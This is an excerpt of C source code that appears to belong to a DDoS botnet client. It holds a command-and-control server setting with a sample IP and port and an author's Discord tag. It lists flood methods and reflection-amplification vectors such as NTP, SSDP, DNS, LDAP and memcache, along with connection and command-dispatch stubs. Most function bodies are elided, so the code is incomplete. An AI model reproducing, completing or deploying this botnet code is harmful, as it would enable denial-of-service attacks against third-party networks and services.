...
unsigned char *commServer[] = {"IP:BOTPORT"}; // <ServerIP>:<BotPort> || <185.244.25.189:23>
...
char *kgfl_discord = "ðŸ…ºðŸ…¶ðŸ…µðŸ…»#8936";
////////////////////////////////////////
...
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
char *c2_methods[] = {"STOMP", "UDP", "STD", "TCP", "CRUSH", "CRASH", "HEX"};
char *iphm_Methods[] = {"LDAP", "LDAPV2", "RAWUDP", "NTP", "SSDP", "DNS", "MEMECACHE"};
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
int initConnection();
...
char *getPortz()
{
 ...
 void Cri(char *method, char *ip, char *port, char *time) {
...
void processCmd(int argc, unsigned char *argv[])
{
        if(!strcmp(argv[0], "UDP"))
        {
                ...
                // We are installing the needed scripts to use amplifications!
